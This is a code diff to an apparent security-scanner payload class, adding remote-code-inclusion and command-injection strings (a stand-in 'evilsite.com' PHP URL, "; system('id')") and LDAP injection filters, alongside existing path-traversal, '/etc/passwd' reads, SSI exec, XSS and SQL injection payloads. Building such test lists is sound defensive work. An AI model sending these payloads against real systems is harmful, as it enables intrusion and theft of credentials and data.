@@ -32,6 +32,18 @@ class Injections():
 
         return xss_injections
 
+    def rce_injections():
+        rce_injections = ["http://evilsite.com/evilcode.php", "; system('id')"]
+
+        return rce_injections
+
+    def ldap_injections():
+        ldap_injections = ["*/*","admin*)((|userpassword=*)",
+        "page_location=crypts)(rank=*))(&(page_location=crypts",
+        "(&(USER = root)(&)","(&(cn=hacker)(cn=*))%00)(userPassword=[pass]))"]
+
+        return ldap_injections
+
     def dast_scan():
         dast_scan = ['../../etc/passwd', '; cat /etc/passwd',
             '<!--#exec cmd="ls ../"-->',"|| regsvr32 /s /n /u /\
@@ -44,6 +56,9 @@ class Injections():
             &commit=Go'/**/</script>","<<SCRIPT>alert('HackThis!!');//<</SCRIPT>",
             '0x200', "' OR 'a'='a", '*/*', "') or \
             (SELECT admin FROM users WHERE admin = true AND ''='",
-            "'UNION ALL SELECT username, password FROM members WHERE admin=1--'"]
+            "'UNION ALL SELECT username, password FROM members WHERE admin=1--'",
+            "*/*","admin*)((|userpassword=*)",
+            "page_location=crypts)(rank=*))(&(page_location=crypts",
+            "(&(USER = root)(&)","(&(cn=hacker)(cn=*))%00)(userPassword=[pass]))"]
 
         return dast_scan
